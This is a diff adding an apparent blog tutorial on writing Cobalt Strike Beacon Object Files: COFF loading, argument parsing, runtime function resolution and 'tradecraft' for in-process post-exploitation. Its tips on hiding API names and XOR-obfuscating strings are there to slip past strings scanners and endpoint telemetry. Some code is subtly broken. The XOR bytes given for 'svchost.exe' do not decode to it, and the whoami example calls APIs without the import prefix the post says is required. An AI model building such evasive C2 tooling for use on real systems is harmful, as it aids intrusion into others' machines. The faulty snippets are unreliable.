@@ -1,0 +1,455 @@
+# https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/
+
+<!DOCTYPE html><html lang="en">
+<body>
+
+  <div class="bg-grid"></div>
+
+  
+
+  <main class="scroll">
+    <div class="pg">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="reading-progress" id="reading-progress" aria-hidden="true" style="transform: scaleX(0);"></div>
+
+<article class="article">
+  
+
+  <div class="article-main">
+    
+
+    
+
+    <div class="article-meta">
+      <span>Apr 09, 2026</span>
+      
+        <span class="wu-diff hard">HARD</span>
+      
+      <span>· 6 MIN READ</span>
+    </div>
+
+    <h1 id="top" class="article-title">Beacon Object Files from Scratch: COFF Loading, Dynamic Resolution, and Battle-Tested Tradecraft</h1>
+    <p class="article-desc">A deep guide to writing Beacon Object Files - from understanding the COFF format and Cobalt Strike's BOF runtime to building a production-grade token-duplication BOF with BeaconPrintf, dynamic function resolution, and thread-safe cleanup.</p>
+
+    
+    <div class="article-tags">
+      <span class="pill">#c2</span><span class="pill">#cobalt-strike</span><span class="pill">#bof</span><span class="pill">#coff</span><span class="pill">#windows</span><span class="pill">#tradecraft</span>
+    </div>
+    
+
+    <div id="toc-inline" class="toc-inline">
+      <div class="toc-label">On this page</div>
+      <ol class="toc-list" id="toc-list-inline"><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#why-bofs" data-target="why-bofs" class="active">Why BOFs</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#the-coff-format-in-5-minutes" data-target="the-coff-format-in-5-minutes">The COFF Format in 5 Minutes</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#your-first-bof---whoami-rewritten" data-target="your-first-bof---whoami-rewritten">Your First BOF - whoami Rewritten</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#argument-parsing---the-beacondata-api" data-target="argument-parsing---the-beacondata-api">Argument Parsing - The BeaconData API</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#output---three-channels" data-target="output---three-channels">Output - Three Channels</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#dynamic-function-resolution---going-beyond-" data-target="dynamic-function-resolution---going-beyond-">Dynamic Function Resolution - Going Beyond $</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#battle-tested-tradecraft" data-target="battle-tested-tradecraft">Battle-Tested Tradecraft</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#1-no-persistent-state" data-target="1-no-persistent-state">1. No Persistent State</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#2-thread-safety" data-target="2-thread-safety">2. Thread Safety</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#3-handle-hygiene" data-target="3-handle-hygiene">3. Handle Hygiene</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#4-memory-allocation" data-target="4-memory-allocation">4. Memory Allocation</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#5-string-obfuscation" data-target="5-string-obfuscation">5. String Obfuscation</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#6-entry-point-is-go" data-target="6-entry-point-is-go">6. Entry-Point Is go</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#7-one-responsibility-per-bof" data-target="7-one-responsibility-per-bof">7. One Responsibility Per BOF</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#a-production-example-steal-token-bof" data-target="a-production-example-steal-token-bof">A Production Example: Steal Token BOF</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#debugging-bofs" data-target="debugging-bofs">Debugging BOFs</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#summary" data-target="summary">Summary</a></li></ol>
+    </div>
+
+    <div class="prose" id="post-content">
+      <h2 id="why-bofs">Why BOFs<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#why-bofs" aria-label="Copy link to Why BOFs"><span aria-hidden="true">#</span></a></h2>
+
+<p>In-process post-exploitation on Cobalt Strike used to mean one of two things: spawn a sacrificial process and run a full executable (noisy), or write a PowerShell script and pipe it through unmanaged PowerShell (AMSI, PS logging).</p>
+
+<p>Beacon Object Files gave us a third option: <strong>compile a C function, load it into the beacon’s address space, run it, unload it</strong>. No new process. No PowerShell. No on-disk artifact.</p>
+
+<p>The trade-off is that BOFs are <em>constrained</em>. No CRT. No exceptions. No globals that persist across calls. You write small, focused, single-purpose capabilities. Get used to that shape and BOFs become your go-to primitive.</p>
+
+<h2 id="the-coff-format-in-5-minutes">The COFF Format in 5 Minutes<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#the-coff-format-in-5-minutes" aria-label="Copy link to The COFF Format in 5 Minutes"><span aria-hidden="true">#</span></a></h2>
+
+<p>A BOF is a <strong>COFF object file</strong> - the same format MSVC produces with <code class="language-plaintext highlighter-rouge">/c</code> (compile, don’t link). It contains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>┌──────────────────────┐
+│ COFF File Header     │ machine, # sections, symbol table offset
+├──────────────────────┤
+│ Section Headers[]    │ .text, .rdata, .data, .bss metadata
+├──────────────────────┤
+│ Raw Section Data     │ machine code, constants, static data
+├──────────────────────┤
+│ Relocations[]        │ per-section: "patch offset X with symbol Y"
+├──────────────────────┤
+│ Symbol Table         │ function and import names
+├──────────────────────┤
+│ String Table         │ long symbol names
+└──────────────────────┘
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<p>The beacon’s BOF loader does five things:</p>
+
+<ol>
+  <li>Allocates RWX memory, copies each section to its proper place.</li>
+  <li>Walks the symbol table, resolves each external symbol:
+    <ul>
+      <li>Cobalt Strike API (<code class="language-plaintext highlighter-rouge">__imp_Beacon*</code>) → static dispatch table</li>
+      <li><code class="language-plaintext highlighter-rouge">__imp_&lt;module&gt;$&lt;function&gt;</code> → <code class="language-plaintext highlighter-rouge">GetProcAddress(LoadLibrary(&lt;module&gt;), &lt;function&gt;)</code></li>
+    </ul>
+  </li>
+  <li>Walks the relocations, patches addresses in the copied sections.</li>
+  <li>Calls <code class="language-plaintext highlighter-rouge">go()</code> - your entry point.</li>
+  <li>Frees the memory when the task completes.</li>
+</ol>
+
+<p>That’s the entire mental model. No PE parser. No import table. Just relocations and a symbol-name convention.</p>
+
+<h2 id="your-first-bof---whoami-rewritten">Your First BOF - <code class="language-plaintext highlighter-rouge">whoami</code> Rewritten<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#your-first-bof---whoami-rewritten" aria-label="Copy link to Your First BOF - whoami Rewritten"><span aria-hidden="true">#</span></a></h2>
+
+<p>The canonical “hello BOF” gets the current user via the Token API:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// whoami.c</span>
+<span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"beacon.h"</span><span class="cp">
+</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">OpenProcessToken</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">PHANDLE</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">TOKEN_INFORMATION_CLASS</span><span class="p">,</span> <span class="n">LPVOID</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">PDWORD</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">LookupAccountSidA</span><span class="p">(</span><span class="n">LPCSTR</span><span class="p">,</span> <span class="n">PSID</span><span class="p">,</span> <span class="n">LPSTR</span><span class="p">,</span> <span class="n">LPDWORD</span><span class="p">,</span> <span class="n">LPSTR</span><span class="p">,</span> <span class="n">LPDWORD</span><span class="p">,</span> <span class="n">PSID_NAME_USE</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetCurrentProcess</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">BOOL</span>   <span class="n">WINAPI</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">HANDLE</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">hToken</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ADVAPI32</span><span class="err">$</span><span class="n">OpenProcessToken</span><span class="p">(</span><span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="n">TOKEN_QUERY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hToken</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_ERROR</span><span class="p">,</span> <span class="s">"OpenProcessToken failed: %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">DWORD</span> <span class="n">sz</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">hToken</span><span class="p">,</span> <span class="n">TokenUser</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sz</span><span class="p">);</span>
+    <span class="n">PTOKEN_USER</span> <span class="n">tu</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTOKEN_USER</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
+    <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">hToken</span><span class="p">,</span> <span class="n">TokenUser</span><span class="p">,</span> <span class="n">tu</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sz</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">256</span><span class="p">],</span> <span class="n">domain</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="n">DWORD</span> <span class="n">nameSz</span> <span class="o">=</span> <span class="mi">256</span><span class="p">,</span> <span class="n">domainSz</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+    <span class="n">SID_NAME_USE</span> <span class="n">use</span><span class="p">;</span>
+    <span class="n">ADVAPI32</span><span class="err">$</span><span class="n">LookupAccountSidA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">tu</span><span class="o">-&gt;</span><span class="n">User</span><span class="p">.</span><span class="n">Sid</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nameSz</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">domainSz</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">use</span><span class="p">);</span>
+
+    <span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_OUTPUT</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\\</span><span class="s">%s"</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+
+    <span class="n">LocalFree</span><span class="p">(</span><span class="n">tu</span><span class="p">);</span>
+    <span class="n">KERNEL32</span><span class="err">$</span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">hToken</span><span class="p">);</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>Compile with MSVC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>cl.exe /c /GS- /W4 whoami.c
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">/GS-</code> disables stack cookies - stack cookies reference <code class="language-plaintext highlighter-rouge">__security_cookie</code>, which isn’t available in BOF land.</p>
+
+<p>Key patterns:</p>
+
+<ul>
+  <li><strong>Dynamic import naming</strong>: <code class="language-plaintext highlighter-rouge">&lt;MODULE&gt;$&lt;function&gt;</code> tells the beacon loader to resolve at runtime via LoadLibrary/GetProcAddress.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">DECLSPEC_IMPORT</code></strong> prevents MSVC from inlining or generating import stubs.</li>
+  <li><strong>No string literals used directly with Windows APIs</strong> - the <code class="language-plaintext highlighter-rouge">BeaconPrintf</code> format string is fine because it’s passed to our own API, but <code class="language-plaintext highlighter-rouge">CreateFile("foo.txt")</code> would leave “foo.txt” in <code class="language-plaintext highlighter-rouge">.rdata</code> where strings scanners find it.</li>
+</ul>
+
+<h2 id="argument-parsing---the-beacondata-api">Argument Parsing - The BeaconData API<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#argument-parsing---the-beacondata-api" aria-label="Copy link to Argument Parsing - The BeaconData API"><span aria-hidden="true">#</span></a></h2>
+
+<p>Aggressor client-side sends typed arguments. The BOF consumes them:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// Aggressor side (aggressor.cna):</span>
+<span class="c1">//   bof_pack($1, "zi", "target.exe", 4096);</span>
+
+<span class="kt">void</span> <span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">datap</span> <span class="n">parser</span><span class="p">;</span>
+    <span class="n">BeaconDataParse</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+
+    <span class="kt">char</span><span class="o">*</span> <span class="n">name</span> <span class="o">=</span> <span class="n">BeaconDataExtract</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>       <span class="c1">// z = zero-terminated string</span>
+    <span class="kt">int</span>   <span class="n">size</span> <span class="o">=</span> <span class="n">BeaconDataInt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">);</span>                 <span class="c1">// i = int32</span>
+    <span class="kt">short</span> <span class="n">port</span> <span class="o">=</span> <span class="n">BeaconDataShort</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">);</span>               <span class="c1">// s = int16</span>
+    <span class="c1">// Binary blob:</span>
+    <span class="kt">int</span> <span class="n">blobLen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">blob</span>  <span class="o">=</span> <span class="n">BeaconDataExtract</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parser</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">blobLen</span><span class="p">);</span>  <span class="c1">// b = binary (reads length-prefixed)</span>
+
+    <span class="c1">// ... use them</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>Pack format letters on the Aggressor side:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Letter</th>
+      <th>Type</th>
+      <th>Reader</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">z</code></td>
+      <td>null-terminated string</td>
+      <td><code class="language-plaintext highlighter-rouge">BeaconDataExtract</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">b</code></td>
+      <td>binary blob (length-prefixed)</td>
+      <td><code class="language-plaintext highlighter-rouge">BeaconDataExtract(&amp;p, &amp;len)</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">i</code></td>
+      <td>4-byte int</td>
+      <td><code class="language-plaintext highlighter-rouge">BeaconDataInt</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">s</code></td>
+      <td>2-byte short</td>
+      <td><code class="language-plaintext highlighter-rouge">BeaconDataShort</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="output---three-channels">Output - Three Channels<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#output---three-channels" aria-label="Copy link to Output - Three Channels"><span aria-hidden="true">#</span></a></h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_OUTPUT</span><span class="p">,</span> <span class="s">"fmt: %s"</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>    <span class="c1">// green, normal</span>
+<span class="n">BeaconPrintf</span><span class="p">(</span><span class="n">CALLBACK_ERROR</span><span class="p">,</span>  <span class="s">"fmt: %d"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>    <span class="c1">// red, error</span>
+<span class="n">BeaconOutput</span><span class="p">(</span><span class="n">CALLBACK_OUTPUT_UTF8</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">buflen</span><span class="p">);</span>  <span class="c1">// raw byte output (non-ASCII safe)</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>Never call <code class="language-plaintext highlighter-rouge">printf</code>, <code class="language-plaintext highlighter-rouge">puts</code>, or <code class="language-plaintext highlighter-rouge">OutputDebugString</code>. They either don’t resolve or go to a channel the operator can’t see.</p>
+
+<h2 id="dynamic-function-resolution---going-beyond-">Dynamic Function Resolution - Going Beyond <code class="language-plaintext highlighter-rouge">$</code><a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#dynamic-function-resolution---going-beyond-" aria-label="Copy link to Dynamic Function Resolution - Going Beyond $"><span aria-hidden="true">#</span></a></h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">MODULE$function</code> pattern only covers what you declared at compile time. For truly dynamic work - resolving <code class="language-plaintext highlighter-rouge">NtWhatever</code> syscalls, for example - you need runtime resolution:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">NtOpenProcess_t</span><span class="p">)(</span><span class="n">PHANDLE</span><span class="p">,</span> <span class="n">ACCESS_MASK</span><span class="p">,</span> <span class="n">POBJECT_ATTRIBUTES</span><span class="p">,</span> <span class="n">PCLIENT_ID</span><span class="p">);</span>
+
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">HMODULE</span> <span class="n">WINAPI</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="n">LPCSTR</span><span class="p">);</span>
+<span class="n">DECLSPEC_IMPORT</span> <span class="n">FARPROC</span> <span class="n">WINAPI</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">HMODULE</span><span class="p">,</span> <span class="n">LPCSTR</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">go</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">HMODULE</span> <span class="n">nt</span> <span class="o">=</span> <span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
+    <span class="n">NtOpenProcess_t</span> <span class="n">NtOpenProcess</span> <span class="o">=</span>
+        <span class="p">(</span><span class="n">NtOpenProcess_t</span><span class="p">)</span><span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">nt</span><span class="p">,</span> <span class="s">"NtOpenProcess"</span><span class="p">);</span>
+
+    <span class="c1">// ... call NtOpenProcess ...</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>For OPSEC: <strong>avoid plaintext API names in <code class="language-plaintext highlighter-rouge">.rdata</code></strong>. Use string stacking or simple XOR:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="kt">char</span> <span class="n">name</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">'N'</span><span class="p">,</span><span class="sc">'t'</span><span class="p">,</span><span class="sc">'O'</span><span class="p">,</span><span class="sc">'p'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'n'</span><span class="p">,</span><span class="sc">'P'</span><span class="p">,</span><span class="sc">'r'</span><span class="p">,</span><span class="sc">'o'</span><span class="p">,</span><span class="sc">'c'</span><span class="p">,</span><span class="sc">'e'</span><span class="p">,</span><span class="sc">'s'</span><span class="p">,</span><span class="sc">'s'</span><span class="p">,</span><span class="mi">0</span><span class="p">};</span>
+<span class="n">NtOpenProcess_t</span> <span class="n">NtOpenProcess</span> <span class="o">=</span> <span class="p">(</span><span class="n">NtOpenProcess_t</span><span class="p">)</span><span class="n">KERNEL32</span><span class="err">$</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">nt</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>MSVC will place the char array on the stack, not in <code class="language-plaintext highlighter-rouge">.rdata</code>.</p>
+
+<h2 id="battle-tested-tradecraft">Battle-Tested Tradecraft<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#battle-tested-tradecraft" aria-label="Copy link to Battle-Tested Tradecraft"><span aria-hidden="true">#</span></a></h2>
+
+<h3 id="1-no-persistent-state">1. No Persistent State<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#1-no-persistent-state" aria-label="Copy link to 1. No Persistent State"><span aria-hidden="true">#</span></a></h3>
+
+<p>BOFs are loaded, executed, unloaded. Globals don’t survive between calls. If you need state, return it to the operator and pass it back in as an argument next call. Don’t stash pointers in the Windows registry or named pipes thinking “the next BOF will pick it up.”</p>
+
+<h3 id="2-thread-safety">2. Thread Safety<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#2-thread-safety" aria-label="Copy link to 2. Thread Safety"><span aria-hidden="true">#</span></a></h3>
+
+<p>Beacon is single-threaded for BOF execution, but the APIs you call are not. If your BOF spawns a thread, <strong>join it before returning</strong>. An orphan thread outliving the BOF means its code was freed while still running - instant crash.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">HANDLE</span> <span class="n">h</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MyWorker</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>     <span class="c1">// required</span>
+<span class="n">CloseHandle</span><span class="p">(</span><span class="n">h</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="3-handle-hygiene">3. Handle Hygiene<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#3-handle-hygiene" aria-label="Copy link to 3. Handle Hygiene"><span aria-hidden="true">#</span></a></h3>
+
+<p>The beacon doesn’t clean up after you. Every <code class="language-plaintext highlighter-rouge">OpenProcessToken</code>, <code class="language-plaintext highlighter-rouge">OpenProcess</code>, <code class="language-plaintext highlighter-rouge">RegOpenKeyEx</code> must have a matching <code class="language-plaintext highlighter-rouge">CloseHandle</code> / <code class="language-plaintext highlighter-rouge">RegCloseKey</code>. Leaks accumulate over multiple task runs and eventually make the beacon unstable.</p>
+
+<h3 id="4-memory-allocation">4. Memory Allocation<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#4-memory-allocation" aria-label="Copy link to 4. Memory Allocation"><span aria-hidden="true">#</span></a></h3>
+
+<p><code class="language-plaintext highlighter-rouge">LocalAlloc</code>/<code class="language-plaintext highlighter-rouge">HeapAlloc</code> are fine - they use the process heap, which the beacon already has. Avoid <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> unless you have a specific reason; it shows up in scanner telemetry.</p>
+
+<h3 id="5-string-obfuscation">5. String Obfuscation<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#5-string-obfuscation" aria-label="Copy link to 5. String Obfuscation"><span aria-hidden="true">#</span></a></h3>
+
+<p>Anything sensitive in <code class="language-plaintext highlighter-rouge">.rdata</code> is an IoC. For a capability that creates a specific registry key or opens a specific SCM service, XOR the string at compile time:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="cp">#define XOR_KEY 0x42
+</span><span class="kt">void</span> <span class="nf">deobf</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span> <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">XOR_KEY</span><span class="p">;</span> <span class="p">}</span>
+
+<span class="c1">// Obfuscated "svchost.exe" = {0x21, 0x36, 0x22, 0x2a, 0x2d, 0x36, 0x36, 0x6c, 0x27, 0x3c, 0x27}</span>
+<span class="kt">char</span> <span class="n">svc</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">};</span>
+<span class="n">deobf</span><span class="p">(</span><span class="n">svc</span><span class="p">,</span> <span class="mi">11</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="6-entry-point-is-go">6. Entry-Point Is <code class="language-plaintext highlighter-rouge">go</code><a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#6-entry-point-is-go" aria-label="Copy link to 6. Entry-Point Is go"><span aria-hidden="true">#</span></a></h3>
+
+<p>Always. You can have other <code class="language-plaintext highlighter-rouge">static</code> helpers in the same file. The loader only calls <code class="language-plaintext highlighter-rouge">go(args, length)</code>.</p>
+
+<h3 id="7-one-responsibility-per-bof">7. One Responsibility Per BOF<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/beacon-object-files-guide/#7-one-responsibility-per-bof" aria-label="Copy link to 7. One Responsibility Per BOF"><span aria-hidden="true">#</span></a></h3>
+
